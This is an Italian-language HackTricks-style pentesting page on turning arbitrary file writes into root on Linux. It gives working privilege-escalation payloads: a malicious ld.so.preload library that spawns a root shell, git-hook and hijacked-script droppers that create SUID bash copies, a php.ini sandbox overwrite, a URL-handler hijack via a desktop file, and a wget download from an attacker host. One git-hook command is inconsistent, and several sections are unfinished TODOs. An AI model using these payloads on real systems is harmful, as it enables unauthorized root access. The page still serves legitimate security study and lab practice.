# Arbitrary File Write to Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Questo file si comporta come la variabile di ambiente **`LD_PRELOAD`**, ma funziona anche nei **SUID binaries**.\
Se puoi crearlo o modificarlo, puoi semplicemente aggiungere un **percorso a una libreria che verrà caricata** con ogni binario eseguito.

Per esempio: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) sono **script** che vengono **eseguiti** su vari **eventi** in un repository git come quando viene creato un commit, un merge... Quindi se uno **script o utente privilegiato** esegue frequentemente queste azioni ed è possibile **scrivere nella cartella `.git`**, ciò può essere usato per il **privesc**.

Per esempio, è possibile **generare uno script** in un repo git in **`.git/hooks`** in modo che venga sempre eseguito quando viene creato un nuovo commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

TODO

### Service & Socket files

TODO

### Overwrite a restrictive `php.ini` used by a privileged PHP sandbox

Alcuni daemon personalizzati convalidano il PHP fornito dall'utente eseguendo `php` con un **`php.ini` restrittivo** (per esempio, `disable_functions=exec,system,...`). Se il codice sandboxato ha ancora **qualsiasi primitive di scrittura** (come `file_put_contents`) e puoi raggiungere il **percorso esatto del `php.ini`** usato dal daemon, puoi **sovrascrivere quella configurazione** per rimuovere le restrizioni e poi inviare un secondo payload che verrà eseguito con privilegi elevati.

Flusso tipico:

1. Il primo payload sovrascrive la configurazione della sandbox.
2. Il secondo payload esegue codice ora che le funzioni pericolose sono riabilitate.

Minimal example (replace the path used by the daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Se il daemon è in esecuzione come root (o effettua validazioni con percorsi di proprietà di root), la seconda esecuzione restituisce un contesto root. Questo è essenzialmente **privilege escalation via config overwrite** quando il sandboxed runtime può ancora scrivere file.

### binfmt_misc

Il file situato in `/proc/sys/fs/binfmt_misc` indica quale binario deve eseguire quale tipo di file. TODO: verificare i requisiti per sfruttare questo meccanismo per eseguire una rev shell quando un tipo di file comune è aperto.

### Sovrascrivere i gestori di schema (come http: o https:)

Un attacker con permessi di scrittura sulle directory di configurazione della vittima può facilmente sostituire o creare file che modificano il comportamento di sistema, portando a esecuzione di codice non intenzionata. Modificando il file `$HOME/.config/mimeapps.list` per puntare i gestori di URL HTTP e HTTPS a un file malevolo (ad es., impostando `x-scheme-handler/http=evil.desktop`), l'attacker garantisce che **cliccare qualsiasi link http o https avvii il codice specificato in quel file `evil.desktop`**. Ad esempio, dopo aver inserito il seguente codice malevolo in `evil.desktop` in `$HOME/.local/share/applications`, qualsiasi clic su un URL esterno esegue il comando incorporato:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Per maggiori informazioni controlla [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) dove è stato usato per sfruttare una vulnerabilità reale.

### Root che esegue script/binari scrivibili dall'utente

Se un workflow privilegiato esegue qualcosa come `/bin/sh /home/username/.../script` (o qualsiasi binary all'interno di una directory di proprietà di un utente non privilegiato), puoi dirottarlo:

- **Rileva l'esecuzione:** monitora i processi con [pspy](https://github.com/DominicBreuker/pspy) per intercettare root che invoca percorsi controllati dall'utente:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** assicurati che sia il file target che la sua directory siano di proprietà e scrivibili dal tuo utente.
- **Hijack the target:** esegui il backup del binary/script originale e deposita un payload che crea una SUID shell (o qualunque altra azione root), poi ripristina i permessi:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Innescare l'azione privilegiata** (es., premendo un pulsante UI che avvia lo helper). Quando root riesegue il hijacked path, prendi la shell escalata con `./rootshell -p`.

## Riferimenti

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)

{{#include ../../banners/hacktricks-training.md}}
